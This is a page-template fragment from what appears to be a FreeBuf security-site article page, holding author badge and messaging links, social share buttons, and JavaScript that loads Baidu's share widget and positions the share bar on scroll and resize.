                            <span>等级：
                                <i class="colour-green">1</i>级
                            </span>
						</div>
									</div>
				<div class="user-center clearfix">
                    					    <a href="http://www.freebuf.com/author/Voraka" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                    					<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=Voraka" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
				</div>
                <div class="share-ctrl clearfix">
                    <div class="bdsharebuttonbox clearfix bdshare-button-style1-24"
                         data-bd-bind="1489991449190">
                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                        <span class="share-line">|</span>
                    </div>
                </div>
				<div class="user-ctrl clearfix">
					<span class='wpfp-span'><a class='wpfp-link' data-toggle='tooltip' data-placement='top' href='?wpfpaction=add&amp;postid=131502' title='收藏' rel='nofollow' id='collect'></a></span>					<a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
											<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=FB%E5%AE%A2%E6%9C%8D" data-toggle="tooltip" data-placement="top" title="文章纠正" id="artiCorrect" target="_blank"></a>
					<!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                    <span class="share-line">|</span>
					<span class="info-alert"></span>
				</div>
			</div>
			<script>
				window._bd_share_config={
					"common": {
						"bdSnsKey": {},
						"bdText": "",
						"bdMini": "2",
						"bdMiniList": ["qzone", "tsina", "weixin"],
						"bdPic": "",
						"bdStyle": "1",
						"bdSize": "24"
					},
					"share":{},
				};
				with(document)0[
					(getElementsByTagName('head')[0]||body).
					appendChild(createElement('script')).
						src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
					];
				//控制垂直方向分享模块的定位
				function shareFixVertical(){
					var offsetTop = jQuery(".article-oper").get(0).offsetTop;
					var win_h = jQuery(window).height();
					var win_w = jQuery(window).width();
					var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
					var _height = offsetTop-scrollTop;
					if(_height>=win_h-255&&win_w>975){
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").offset().left+15;
						jQuery(".share-new").addClass("fixed");
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});

					}else{
						jQuery(".share-new").removeClass("fixed");
						jQuery(".share-new").css({
							width: "100%"
						});
					}
				}
				//控制水平方向分享模块的定位
				function shareFixHorizontal(){
					var _width = jQuery("#getWidth").innerWidth()-30;
					var _left = jQuery("#getWidth").get(0).offsetLeft+15;
					var win_w = document.documentElement.clientWidth || document.body.clientWidth;
					console.log(win_w);
					jQuery(".fixed").css({
						width:_width,
						left:_left
					});
					if(win_w< 975){
						jQuery(".share-new").css({
							width: "100%",
							left: "0"
						});
					}else{
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").get(0).offsetLeft+15;
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});
					}
				}
                function click(){
                    var _w = jQuery(window).width();
                    jQuery(document).click(function(e){
                        if(jQuery(e.target).attr("id")=="weixin"){
                            if(_w <= 760) {
                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                layer.open({
                                    title: '提示',
                                    btnAlign: 'c',
                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                    area: '260px'
                                });
                            }else {
                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                            }
                        }else {
                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                        }
                    });
                }

				jQuery(window).on("load",function(){
					shareFixVertical();
					click();
				});

				jQuery(window).on("scroll",function(){
					shareFixVertical();
				});

				jQuery(window).on("resize",function(){
					shareFixHorizontal();
					click();
				})

                //tooltips提示
                $(function () { $("[data-toggle='tooltip']").tooltip(); });
			</script>
 